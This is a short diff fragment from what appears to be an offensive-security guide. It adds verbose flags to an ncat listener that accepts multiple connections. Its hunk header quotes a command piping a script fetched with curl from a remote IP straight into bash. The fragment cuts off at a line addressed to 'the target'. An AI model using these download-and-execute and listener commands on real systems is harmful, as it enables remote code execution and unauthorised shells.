@@ -1135,7 +1135,7 @@ curl -skfL https://3.13.3.7:8080 | bash
 
 Start ncat to listen for multiple connections:
 ```sh
-ncat -kl 1524
+ncat -kltv 1524
 ```
 ```sh
 # On the target:
